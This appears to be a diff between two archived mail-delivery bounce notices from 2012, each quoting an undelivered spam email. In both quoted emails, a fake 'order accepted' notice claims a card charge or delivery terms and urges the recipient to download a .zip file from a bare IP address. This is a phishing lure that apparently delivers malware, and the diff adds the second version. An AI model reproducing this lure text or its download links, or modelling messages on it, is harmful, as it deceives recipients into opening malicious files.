@@ -1,7 +1,8 @@
-From: Mail Delivery System <Mailer-Daemon-Pl18aVvLXHGHYieOayEoLQ@public.gmane.org>
+From: Mail Delivery System <Mailer-Daemon-9B63tZgOHM8qcZcGjlUOXw@public.gmane.org>
 Subject: Mail delivery failed: returning message to sender
-Date: Tue, 14 Aug 2012 01:47:02 +0100
-Message-ID: <E1T15Hi-0007aV-CX@lambda.srv2.com>
+Date: Tue, 14 Aug 2012 03:01:07 +0200
+Message-ID: <E1T15VL-0007tp-6n@mx.expurgate.net>
+Reply-To: postmaster-9B63tZgOHM8qcZcGjlUOXw@public.gmane.org
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -23,57 +24,61 @@ This message was created automatically by mail delivery software.
 A message that you sent could not be delivered to one or more of its
 recipients. This is a permanent error. The following address(es) failed:
 
-  clawer-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<clawer-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org>:
-    host cluster8.eu.messagelabs.com [85.158.140.211]:
-    550 Invalid recipient <clawer-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org> (#5.1.1)
-  clawed-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<clawed-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org>:
-    host cluster8.eu.messagelabs.com [85.158.140.211]:
-    550 Invalid recipient <clawed-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org> (#5.1.1)
-  claw-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<claw-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org>:
-    host cluster8.eu.messagelabs.com [85.158.140.211]:
-    550 Invalid recipient <claw-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org> (#5.1.1)
-  clavius-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<clavius-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org>:
-    host cluster8.eu.messagelabs.com [85.158.140.211]:
-    550 Invalid recipient <clavius-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org> (#5.1.1)
-  clavis-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org
-    SMTP error from remote mail server after RCPT TO:<clavis-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org>:
-    host cluster8.eu.messagelabs.com [85.158.140.211]:
-    550 Invalid recipient <clavis-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org> (#5.1.1)
+  infodd-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<infodd-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org>:
+    host 145.253.127.19 [145.253.127.19]: 550 No such recipient
+  infod-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<infod-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org>:
+    host 145.253.127.19 [145.253.127.19]: 550 No such recipient
+  igerdd-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<igerdd-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org>:
+    host 145.253.127.19 [145.253.127.19]: 550 No such recipient
+  igerd-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<igerd-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org>:
+    host 145.253.127.19 [145.253.127.19]: 550 No such recipient
+  idarsteinnn-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org
+    SMTP error from remote mail server after RCPT TO:<idarsteinnn-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org>:
+    host 145.253.127.19 [145.253.127.19]: 550 No such recipient
 
 ------ This is a copy of the message, including all the headers. ------
 
 Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: from [67.212.81.158] (port=42087 helo=server1.linesearchbar.com)
-	by lambda.srv2.com with esmtpa (Exim 4.77)
+Received: from mx.expurgate.net (helo=localhost)
+	by mx.expurgate.net with esmtp
+	id 1T15VK-0007st-7I; Tue, 14 Aug 2012 03:01:06 +0200
+Received: from [67.212.81.158] (helo=server1.linesearchbar.com)
+	by mx.expurgate.net with ESMTP (eXpurgate 4.0.0)
 	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1T15Hh-0007aH-Tz; Tue, 14 Aug 2012 01:47:02 +0100
-Received: from [67.212.81.158] by server1.linesearchbar.com id Ku8w3Je3p0Yw with SMTP; Mon, 13 Aug 2012 20:47:00 -0400
-Date: Mon, 13 Aug 2012 20:47:00 -0400
-From: "Info" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.6.53.6) Business
-X-Priority: 3 (Normal)
-Message-ID: <426298977.06397390908958-HQcOjwhNS1czlmahCj5iVsTo8j6oEMgcAL8bYrjMMd8@public.gmane.org>
-To: <clavis-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org>
-Subject: Your order has been accepted
+	id 50299ea0-20ed-43d4519eb906-1
+	for <multiple-recipients>; Tue, 14 Aug 2012 02:41:05 +0200
+Received: from [67.212.81.158] by server1.linesearchbar.com id qbEWEsyjIiHT; Mon, 13 Aug 2012 20:41:03 -0400
+Message-ID: <006f01cd79b5$7a35cc80$0200a8c0-HQcOjwhNS1czlmahCj5iVsTo8j6oEMgcAL8bYrjMMd8@public.gmane.org>
+From: "INCo Group" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <idarsteinnn-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org>
+Subject: Order #579303
+Date: Mon, 13 Aug 2012 20:41:03 -0400
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
 Content-Transfer-Encoding: 8bit
+X-purgate-ID: expurgator-9b2b54/1344904865-000020ED-D2189431/3636051613-0/0-19
+X-purgate-type: clean
+X-purgate-size: 294
+X-purgate-Ad: Categorized by eleven eXpurgate (R) http://www.eleven.de
+X-purgate: This mail is considered clean (visit http://www.eleven.de for further information)
+X-purgate: clean
 
 
 
 
-Hello, 
+Dear client, 
+Your order has been accepted.
 
-Thank you for the order, 
-your credit card will be charged for 279 dollars.
-For more information, please visit our web site:
-http://81.201.222.181/pdf/Payment.zip?id.download=clavis-C/I4BJQLm1Dc8OS+UCLs1w@public.gmane.org_LjnYTCUO
+Order id: 69018094.
+
+Terms of delivery and the date can be found with the auto-generated msword file
+located at:
+http://109.123.65.237/pdf/Customer.zip?id.download=idarsteinnn-5kPDXKf0QeU5WgrkcBd8vg@public.gmane.org_kIXXXImvlv
 
 ==
-Best regards, 
-ticket service.
+Tel.: (064) 054 90 913
